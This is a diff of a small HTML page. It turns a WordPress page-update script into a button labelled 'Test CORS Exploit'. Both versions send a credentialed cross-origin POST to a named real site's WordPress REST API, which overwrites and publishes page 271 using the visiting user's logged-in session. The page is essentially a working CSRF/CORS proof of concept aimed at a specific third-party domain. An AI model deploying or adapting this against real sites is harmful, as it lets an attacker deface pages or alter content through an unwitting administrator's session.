@@ -1,38 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Apple Page Update Test</title>
-</head>
+<html>
 <body>
-  <h2>Updating WordPress Page...</h2>
-  <pre id="result" style="background: #eee; padding: 10px;"></pre>
+  <h3>Test CORS Exploit</h3>
+  <button onclick="runExploit()">Run Test</button>
+  <pre id="output"></pre>
 
   <script>
-    fetch('https://lahanparagon.edu.np/wp-json/wp/v2/pages/271', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        title: 'About Apple',
-        content: '<h1>Apple Inc. is a global leader in technology and innovation.</h1>',
-        status: 'publish'
+    function runExploit() {
+      fetch("https://lahanparagon.edu.np/wp-json/wp/v2/pages/271", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          title: "⚠️ CORS Test",
+          content: "<h1>This was changed from another domain!</h1>",
+          status: "publish"
+        })
       })
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-      return response.json();
-    })
-    .then(data => {
-      document.getElementById('result').textContent = '✅ Page updated successfully:\n\n' + JSON.stringify(data, null, 2);
-    })
-    .catch(error => {
-      document.getElementById('result').textContent = '❌ Error updating page:\n\n' + error.message;
-    });
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById('output').textContent = "✅ Success:\n" + JSON.stringify(data, null, 2);
+      })
+      .catch(err => {
+        document.getElementById('output').textContent = "❌ Failed:\n" + err.message;
+      });
+    }
   </script>
 </body>
 </html>
